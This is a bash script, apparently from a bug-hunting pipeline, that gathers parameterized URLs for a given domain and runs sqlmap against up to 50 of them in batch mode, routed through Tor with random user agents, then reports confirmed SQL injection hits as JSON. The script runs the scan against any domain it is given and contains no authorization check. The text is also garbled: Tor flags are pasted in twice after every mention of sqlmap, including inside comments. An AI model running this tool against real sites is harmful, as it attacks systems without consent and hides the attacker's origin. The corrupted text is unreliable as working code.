#!/bin/bash
# sqli.sh — sqlmap --tor --tor-port=9050 --tor-type=SOCKS5 --tor --tor-port=9050 --tor-type=SOCKS5 analyzer against URLs with parameters
# Usage: sqli.sh <target-domain>
# Stdout: JSON summary { dbms, output_dir }
# Files:  ~/Targets/<target>/tool-output/sqli/

set +e

TARGET="${1:?target domain required}"
HUNT_DIR="${HOME}/Targets/${TARGET}"
OUT_DIR="${HUNT_DIR}/tool-output/sqli"
mkdir -p "$OUT_DIR"

URLS="${HUNT_DIR}/tool-output/recon/urls.txt"
PARAM_URLS="${OUT_DIR}/param-urls.txt"
LOG="${OUT_DIR}/sqlmap.log"

[ -s "$URLS" ] && grep '?' "$URLS" | grep '=' | sort -u > "$PARAM_URLS"

if [ ! -s "$PARAM_URLS" ]; then
  echo '{"tool":"sqli","target":"'"$TARGET"'","confirmed_count":0,"reason":"no parameterized URLs"}'
  exit 0
fi

# Cap to top 50 URLs (sqlmap --tor --tor-port=9050 --tor-type=SOCKS5 --tor --tor-port=9050 --tor-type=SOCKS5 is slow)
head -50 "$PARAM_URLS" > "${PARAM_URLS}.top"

# Honor HTTPS_PROXY / HTTP_PROXY env (sqlmap --tor --tor-port=9050 --tor-type=SOCKS5 --tor --tor-port=9050 --tor-type=SOCKS5 does NOT read them — must pass --proxy).
# Translate socks5h:// → socks5:// since sqlmap --tor --tor-port=9050 --tor-type=SOCKS5 --tor --tor-port=9050 --tor-type=SOCKS5 doesn't recognize the `h` suffix.
SQLMAP_PROXY_ARGS=()
PROXY_URL="${HTTPS_PROXY:-${HTTP_PROXY:-}}"
if [ -n "$PROXY_URL" ]; then
  SQLMAP_PROXY_ARGS+=(--proxy "${PROXY_URL/socks5h:/socks5:}")
fi

# 5 min hard cap, batch mode, level 1 risk 1 (default = fast)
timeout 300 sqlmap --tor --tor-port=9050 --tor-type=SOCKS5 --tor --tor-port=9050 --tor-type=SOCKS5 -m "${PARAM_URLS}.top" --batch --random-agent \
  --threads 5 --timeout 10 --retries 1 --level 1 --risk 1 \
  "${SQLMAP_PROXY_ARGS[@]}" \
  --output-dir "$OUT_DIR" --disable-coloring 2>&1 | tail -200 > "$LOG"

# Detect "is vulnerable" or "back-end DBMS" markers
HITS=$(grep -cE "is vulnerable|back-end DBMS" "$LOG" 2>/dev/null || echo 0)
DBMS=$(grep -oE "back-end DBMS: [^\\\\]+" "$LOG" | head -1 | sed 's/back-end DBMS: //' || echo "unknown")

cat <<EOF
{"tool":"sqli","target":"${TARGET}","output_dir":"${OUT_DIR}","log":"${LOG}","confirmed_count":${HITS},"dbms":"${DBMS:-none}","urls_tested":$(wc -l < "${PARAM_URLS}.top" 2>/dev/null || echo 0)}
EOF
